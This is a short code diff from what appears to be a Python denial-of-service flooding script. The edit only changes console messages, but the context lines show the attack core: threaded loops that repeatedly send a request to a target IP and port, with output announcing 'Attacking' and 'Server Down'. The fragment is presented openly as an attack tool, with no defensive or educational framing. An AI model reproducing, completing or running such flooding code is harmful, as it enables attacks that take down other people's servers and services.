@@ -117,10 +117,10 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent: {2}".format(str(ip), int(port), xx))
+            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent•> {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print("\033[36m[+]\033[33m Server Down Sent: {2}", xx))
+            print("\033[36m[+]\033[33m Server Down\033[36m Sent •>\033[31m", xx)
 
 for x in range(threads):
     threads = threading.Thread(target=start)
